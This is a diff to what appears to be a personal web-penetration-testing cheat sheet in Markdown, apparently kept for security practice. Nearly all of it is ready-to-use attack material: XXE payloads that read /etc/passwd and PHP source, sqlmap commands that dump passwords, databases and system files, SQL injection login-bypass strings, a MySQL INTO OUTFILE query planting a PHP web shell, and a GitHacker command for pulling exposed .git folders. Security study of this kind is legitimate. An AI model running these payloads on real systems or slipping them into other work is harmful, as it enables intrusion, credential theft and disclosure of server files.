@@ -50,34 +50,6 @@ owasp-zap
 SELECT "<?php system($_GET['cmd']); ?>" into outfile "/dir/dir/file.php"
 ```
 
-## XML external entity (XXE)
-### Read File
-```xml
-<!DOCTYPE foo [
-    <!ENTITY file SYSTEM "file:///etc/passwd">
-]>
-<foo>Hello &file;</foo>
-```
-```xml
-<!DOCTYPE foo [
-    <!ENTITY file SYSTEM "php://filter/read=convert.base64-encode/resource=/etc/passwd" >
-]>
-<foo>Hello &file;</foo>
-```
-### Get Link
-```xml
-<!DOCTYPE foo [
-    <!ENTITY file SYSTEM "http://example.com/path">
-]>
-<foo>Hello &file;</foo>
-```
-```xml
-<!DOCTYPE foo [
-    <!ENTITY file SYSTEM "php://filter/read=convert.base64-encode/resource=index.php">
-]>
-<foo>Hello &file;</foo>
-```
-
 ## MySql
 ### Connect to mysql
 ```
@@ -120,11 +92,25 @@ or open in vs code
 ## SQL Injection
 ### SQLmap
 ```
+# See Vulnerability
 sqlmap -r req --batch
+# Check Passwords
 sqlmap -r req --batch --passwords
+# Get DB
 sqlmap -r req --batch --dbs
 sqlmap -r req --batch --fetch --tables -D db
 sqlmap -r req --batch --dump -T table -D db
+# Check Privilege of DB
+sqlmap -r req --privileges
+# Read file
+sqlmap -r req --file-read=/etc/passwd
+```
+
+## Pattern
+```
+" OR ""="
+' OR ''='
+' OR 1=1 -- comment
 ```
 
 ## Request
@@ -155,7 +141,6 @@ r = s.post('http://example.com/submit',
 print(r.status_code, r.url)
 ```
 
-
 ## Path traversal
 
 [Bypassing with Unicode Compatibility](https://jlajara.gitlab.io/web/2020/02/19/Bypass_WAF_Unicode.html)
@@ -174,3 +159,31 @@ print(r.status_code, r.url)
 githacker --url http://url/.git/ --folder result
 ```
 [Source](https://github.com/WangYihang/GitHacker)
+
+## XML external entity (XXE)
+### Read File
+```xml
+<!DOCTYPE foo [
+    <!ENTITY file SYSTEM "file:///etc/passwd">
+]>
+<foo>Hello &file;</foo>
+```
+```xml
+<!DOCTYPE foo [
+    <!ENTITY file SYSTEM "php://filter/read=convert.base64-encode/resource=/etc/passwd" >
+]>
+<foo>Hello &file;</foo>
+```
+### Get Link
+```xml
+<!DOCTYPE foo [
+    <!ENTITY file SYSTEM "http://example.com/path">
+]>
+<foo>Hello &file;</foo>
+```
+```xml
+<!DOCTYPE foo [
+    <!ENTITY file SYSTEM "php://filter/read=convert.base64-encode/resource=index.php">
+]>
+<foo>Hello &file;</foo>
+```
